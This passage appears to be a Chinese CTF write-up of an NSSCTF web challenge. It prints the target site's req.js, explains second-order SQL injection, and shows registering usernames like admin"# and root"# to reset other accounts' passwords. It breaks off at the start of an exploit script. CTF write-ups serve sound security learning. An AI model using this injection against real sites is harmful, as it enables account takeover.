<p>测试了一下id&#x3D;1和id&#x3D;2，分别回显I’m root和I’m admin</p>
<p>先扫一下看看有没有什么信息泄露</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102102402294.png" alt="image-20231102102402294"></p>
<p>几个泄露的路由都看了一下，发现只有static&#x2F;req.js下存在与登录注册相关的代码，貌似没找到什么有价值的东西</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> name<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-floating>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> pass<span class="token operator">=</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-floating>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/?c=app&amp;m=login'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">'name='</span> <span class="token operator">+</span> name<span class="token operator">+</span><span class="token string">'&amp;pass='</span> <span class="token operator">+</span> pass<span class="token punctuation">,</span>
        <span class="token comment">// async:true,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> res<span class="token operator">=</span>$<span class="token punctuation">.</span><span class="token function">parseJSON</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">switch</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">case</span> <span class="token string">'user'</span><span class="token operator">:</span> location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"/?c=user"</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token string">'admin'</span><span class="token operator">:</span> location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"/?c=admin"</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token string">'root'</span><span class="token operator">:</span> location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"/?c=root"</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'alertFlag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'alertData'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">userUpdateInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> name<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> oldPass<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> newPass<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> saying<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/?c=user&amp;m=updateUserInfo'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">'name='</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">'&amp;newPass='</span><span class="token operator">+</span>newPass<span class="token operator">+</span><span class="token string">'&amp;oldPass='</span><span class="token operator">+</span>oldPass<span class="token operator">+</span><span class="token string">'&amp;saying='</span><span class="token operator">+</span>saying<span class="token punctuation">,</span>
        <span class="token comment">// async:true,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">alertHandle</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">signOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/?c=app&amp;m=signOut'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">alertHandle</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">alertHandle</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> res<span class="token operator">=</span>$<span class="token punctuation">.</span><span class="token function">parseJSON</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'alertFlag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'alertData'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token string">'location'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        location<span class="token punctuation">.</span>href<span class="token operator">=</span>res<span class="token punctuation">[</span><span class="token string">'location'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">changeAdminPage</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> page<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.page'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token operator">==</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'?c=admin&amp;m=getUserList&amp;page='</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token operator">==</span><span class="token string">'last'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'?c=admin&amp;m=getUserList&amp;page='</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">changeRootPage</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> page<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.page'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token operator">==</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'?c=root&amp;m=getUserInfo&amp;page='</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token operator">==</span><span class="token string">'last'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'?c=root&amp;m=getUserInfo&amp;page='</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">updatePass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// let name=encodeURIComponent(Base64.encode($(".input-group>input").eq(0).val()))</span>
    <span class="token comment">// let oldPass=$(".input-group>input").eq(1).val()?hex_md5($(".input-group>input").eq(1).val()):'';</span>
    <span class="token comment">// let newPass=$(".input-group>input").eq(2).val()?hex_md5($(".input-group>input").eq(2).val()):'';</span>
    <span class="token comment">// let saying=encodeURIComponent(Base64.encode($(".input-group>input").eq(3).val()))</span>
    <span class="token comment">// $.ajax(&#123;</span>
    <span class="token comment">//     url: '/?c=admin&amp;m=updatePass',</span>
    <span class="token comment">//     type: 'post',</span>
    <span class="token comment">//     data: 'name='+name+'&amp;newPass='+newPass+'&amp;oldPass='+oldPass+'&amp;saying='+saying,</span>
    <span class="token comment">//     // async:true,</span>
    <span class="token comment">//     dataType: 'text',</span>
    <span class="token comment">//     success: function(data)&#123;</span>
    <span class="token comment">//         alertHandle(data);</span>
    <span class="token comment">//     &#125;</span>
    <span class="token comment">// &#125;);</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">adminHome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'/?c=root'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">getUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'/?c=root&amp;m=getUserInfo'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">getLogList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'/?c=root&amp;m=getLogList'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">downloadLog</span><span class="token punctuation">(</span><span class="token parameter">filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'/?c=root&amp;m=downloadRequestLog&amp;filename='</span><span class="token operator">+</span>filename<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> name<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-floating>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> pass<span class="token operator">=</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-floating>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> saying<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".form-floating>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/?c=app&amp;m=register'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">'name='</span> <span class="token operator">+</span> name<span class="token operator">+</span><span class="token string">'&amp;pass='</span> <span class="token operator">+</span> pass <span class="token operator">+</span><span class="token string">'&amp;saying='</span> <span class="token operator">+</span>saying<span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">// console.log(data);</span>
            <span class="token function">alertHandle</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>回到登录注册界面，先注册一个账号试试，登录后发现可以修改密码</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102102819245.png" alt="image-20231102102819245"></p>
<p>这个时候就可以猜测能否通过<strong>二次注入</strong>的方式登录admin或者root账号，然后修改密码</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><blockquote>
<p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p>
</blockquote>
<p>原理：from <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/167089.html">https://www.freebuf.com/articles/web/167089.html</a></p>
<p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102103428476.png" alt="image-20231102103428476"></p>
<p>大概的意思就是我们在注册的时候输入的sql注入语句会被转义，但是因为提供了例如修改密码之类的功能，会取出我们注入的语句，这样如果在存回数据库的时候没有再次转义，那么就会造成sql二次注入</p>
<p>这题就是这样，我们去注册一个用户名为<code>admin&quot;#</code>，密码为1的账号并登录（测试发现是双引号闭合）</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102104312704.png" alt="image-20231102104312704"></p>
<p>成功注入成能修改admin账户的密码</p>
<p>那么修改admin的密码，原密码还是我们<code>admin&quot;#</code>的密码，然后返回，登录admin成功</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102104720593.png" alt="image-20231102104720593"></p>
<p>在admin账户下除了能找到user的信息以外没有其他有价值的东西，应该是要登录root</p>
<p>那么同样的，我们注册一个<code>root&quot;#</code>来修改密码</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102105202487.png" alt="image-20231102105202487"></p>
<p>但是提示我们没有权限，抓包看到这里的参数，猜测和之前看到的req.js源码有关，回去看看相关的源码</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">userUpdateInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> name<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> oldPass<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> newPass<span class="token operator">=</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">hex_md5</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> saying<span class="token operator">=</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".input-group>input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/?c=user&amp;m=updateUserInfo'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">'name='</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">'&amp;newPass='</span><span class="token operator">+</span>newPass<span class="token operator">+</span><span class="token string">'&amp;oldPass='</span><span class="token operator">+</span>oldPass<span class="token operator">+</span><span class="token string">'&amp;saying='</span><span class="token operator">+</span>saying<span class="token punctuation">,</span>
        <span class="token comment">// async:true,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">alertHandle</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">updatePass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// let name=encodeURIComponent(Base64.encode($(".input-group>input").eq(0).val()))</span>
    <span class="token comment">// let oldPass=$(".input-group>input").eq(1).val()?hex_md5($(".input-group>input").eq(1).val()):'';</span>
    <span class="token comment">// let newPass=$(".input-group>input").eq(2).val()?hex_md5($(".input-group>input").eq(2).val()):'';</span>
    <span class="token comment">// let saying=encodeURIComponent(Base64.encode($(".input-group>input").eq(3).val()))</span>
    <span class="token comment">// $.ajax(&#123;</span>
    <span class="token comment">//     url: '/?c=admin&amp;m=updatePass',</span>
    <span class="token comment">//     type: 'post',</span>
    <span class="token comment">//     data: 'name='+name+'&amp;newPass='+newPass+'&amp;oldPass='+oldPass+'&amp;saying='+saying,</span>
    <span class="token comment">//     // async:true,</span>
    <span class="token comment">//     dataType: 'text',</span>
    <span class="token comment">//     success: function(data)&#123;</span>
    <span class="token comment">//         alertHandle(data);</span>
    <span class="token comment">//     &#125;</span>
    <span class="token comment">// &#125;);</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看上去userUpdateInfo方法只能修改user的密码，而被注释的updatePass方法中url为<code>/?c=admin&amp;m=updatePass</code>，猜测是要用admin账户来修改root的密码</p>
<p>那么抓包访问对应路由进行注入，注：从上面的代码可以知道我们对参数的输入都需要经过base64编码，而且密码还要先经过一次md5加密</p>
<p>可以用一下别人已经写好的脚本，password用的是admin的密码，pass2是你要修改root的密码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
<span class="token keyword">import</span> requests
